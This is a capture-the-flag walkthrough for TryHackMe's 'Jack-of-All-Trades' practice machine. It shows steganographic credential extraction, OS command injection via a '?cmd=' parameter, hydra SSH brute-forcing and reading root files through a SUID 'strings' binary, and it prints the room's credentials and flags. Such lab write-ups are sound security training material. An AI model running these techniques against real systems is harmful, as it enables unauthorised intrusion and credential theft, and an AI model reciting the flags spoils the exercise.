# TryHackMe: Jack-of-All-Trades — Walkthrough
Room Information
- Target OS: Linux
- Difficulty: Easy / Intermediate
- Topics: Port Scanning, FastCGI Enumeration, Multi-stage Decoding, Steganography, Command Injection, SSH Brute-Forcing, SUID Exploitation

## 1. Reconnaissance & Nmap Enumeration
An initial Nmap scan revealed open services on non-standard ports:
```bash
nmap -sC -sV -p- 10.48.180.154
```
- Port 22/tcp: Web Server (Apache HTTPD / PHP)
- Port 80/tcp: OpenSSH 7.2p2 (SSH running on port 80)

Running ```gobuster``` against port 22 discovered the following endpoint:
- ```[http://10.48.180.154:22/recovery.php](http://10.48.180.154:22/recovery.php)```

2. Recovery Hint Decoding & Steganography Extraction
Decryption Pipeline
Inspecting the HTML comment inside ```/recovery.php``` revealed a Base32 string:
```plaintext
GQ2TOMRXME3TEN3BGZTDOMRWGUZDANRXG42TMJWG4ZDANRXG42TOMRSGA3TANRVG4ZDOMJXGI3DCNRXG43DMZJXHE3DMMRQGY3TMMRSGA3DONZVG4ZDEMBWGU3TENZQGYZDMOJXGI3DKNTDGIYDOOJWGI3TINZWGYYTEMBWMU3DKNZSGIYDONJXGY3TCNZRG4ZDMMJSGA3DENRRGIYDMNZXGU3TEMRQG42TMMRXME3TENRTGZSTONBXGIZDCMRQGU3DEMBXHA3DCNRSGZQTEMBXGU3DENTBGIYDOMZWGI3DKNZUG4ZDMNZXGM3DQNZZGIYDMYZWGI3DQMRQGZSTMNJXGIZGGMRQGY3DMMRSGA3TKNZSGY2TOMRSG43DMMRQGZSTEMBXGU3TMNRRGY3TGYJSGA3GMNZWGY3TEZJXHE3GGMTGGMZDINZWHE2GGNBUGMZDINQ=
```
Passing this string through Base32 Decryption $\rightarrow$ Hex Decoding $\rightarrow$ ROT13 (Shift 13) yielded:
"Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TVyQ2S"

Steganography Analysis (```steghide```)
The shortlink pointed to the Wikipedia page for Stegosauria, confirming steganographic embedding on home page assets:
1. ```stego.jpg```: Extracted creds.txt containing a distraction note.
2. ```header.jpg```: Successfully extracted ```cms.creds``` using an empty passphrase:
```bash
steghide extract -sf header.jpg
```
Credentials Discovered:
- Username: jackinthebox
- Password: TplFxiSHjY

## 3. Web Command Injection & SSH Access
Authenticating on ```recovery.php``` redirected to a hidden web path:```[http://10.48.180.154:22/nnxhweOV/index.php](http://10.48.180.154:22/nnxhweOV/index.php)```

Command Execution
The parameter ```?cmd=``` allowed direct OS command injection as ```www-data```:
- ```?cmd=id $\rightarrow$ uid=33(www-data)gid=33(www-data)```
- ```?cmd=ls+/home``` $\rightarrow$ Identified user directory ```jack``` and file ```jacks_password_list```
- ```?cmd=cat+/home/jacks_password_list``` $\rightarrow$ Retrieved a custom list of SSH passwords.

SSH Brute-Forcing & Login
With SSH running on port 80, ```hydra``` was executed against user ```jack``` using the extracted password list:
```bash
hydra -l jack -P plist ssh://10.48.180.154:80
```
- Valid SSH Credentials: ```jack : ITMJpGGIqg1jn?>@```
```bash
ssh jack@10.48.180.154 -p 80
```
User Flag Retrieval

Inside ```/home/jack```, the user flag was stored inside an image file (```user.jpg```). After transferring the file locally using ```nc```, opening it displayed a recipe containing the flag:
- User Flag: ```securi-tay2020_{p3ngu1n-hunt3r-3xtr40rd1n41r3}```

## 4. Privilege Escalation to Root
SUID Enumeration
Checking for SUID binaries identified an abnormal permission set on ```/usr/bin/strings```:
```bash
find / -perm -u=s -type f 2>/dev/null
```
```plaintext
/usr/bin/strings
/usr/bin/sudo
/bin/mount
/bin/su
...
```
Exploitation
Since ```/usr/bin/strings``` ran with SUID root privileges, it was leveraged to read restricted files directly without escalating the shell prompt:
```bash
strings /root/root.txt
```
Root Flag Output
```plaintext
ToDo:
1.Get new penguin skin rug -- surely they won't miss one or two of those blasted creatures?
2.Make T-Rex model!
3.Meet up with Johny for a pint or two
4.Move the body from the garage, maybe my old buddy Bill from the force can help me hide her?
5.Remember to finish that contract for Lisa.
6.Delete this: securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}
```
- Root Flag: ```securi-tay2020_{6f125d32f38fb8ff9e720d2dbce2210a}```
